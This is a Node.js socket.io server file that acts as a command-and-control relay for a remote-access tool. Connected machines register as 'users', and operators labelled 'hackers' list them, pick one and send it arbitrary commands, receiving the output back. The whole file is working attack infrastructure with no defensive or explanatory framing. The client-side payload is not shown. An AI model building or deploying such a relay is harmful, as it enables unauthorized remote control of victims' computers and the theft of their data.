const SEND_PORT = 7681;
const REC_PORT = 7670;
const io = require("socket.io");

const sendIO = io.listen(SEND_PORT);
const recIO = io.listen(REC_PORT);

const users = {};
const hackers = {};

sendIO.on("connection", (socket) => {
  let socketUser = "";
  log("connection", `${socket.client.id}`);

  socket.on("new-user", (newUser) => {
    socketUser = newUser.substr(0, newUser.length - 1);
    log("new user", `${socketUser}`);
    users[socketUser] = socket;
  });

  socket.on("performed-command", (data) => {
    const { user } = data;
    hackers[user].emit("performed-command", data);
  });

  socket.on("disconnect", () => {
    log("disconnect", `${socketUser}`);
    delete users[socketUser];
  });
});

recIO.on("connection", (socket) => {
  let socketUser = "";
  let currentConnection = "";

  log("connection", `${socket.client.id}`);

  socket.on("new-hacker", (newHacker) => {
    socketUser = newHacker.substr(0, newHacker.length - 1);
    log("new hacker", socketUser);
    hackers[socketUser] = socket;
  });

  socket.on("show-users", () => {
    log(socketUser, "show");
    socket.emit("show-users", Object.keys(users));
  });

  socket.on("connect-user", (connectTo) => {
    log(socketUser, `Connecting to ${connectTo}`);
    if (!(connectTo in users)) {
      socket.emit("connect-user", { success: 0, connectTo: connectTo });
    } else {
      currentConnection = connectTo;
      socket.emit("connect-user", { success: 1, connectTo: connectTo });
    }
  });

  socket.on("return", () => {
    log(socketUser, `Terminating connection to ${currentConnection}`);
    currentConnection = "";
    socket.emit("return");
  });

  socket.on("perform-command", (command) => {
    if (!(currentConnection in users)) {
      socket.emit("performed-command", {
        result: "User disconnected from server. Connect to another user",
      });
    } else {
      users[currentConnection].emit("perform-command", {
        user: socketUser,
        command: command,
      });
    }
  });

  socket.on("disconnect", () => {
    log("hacker disconnect", `${socketUser}`);
    delete hackers[socketUser];
  });
});

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}
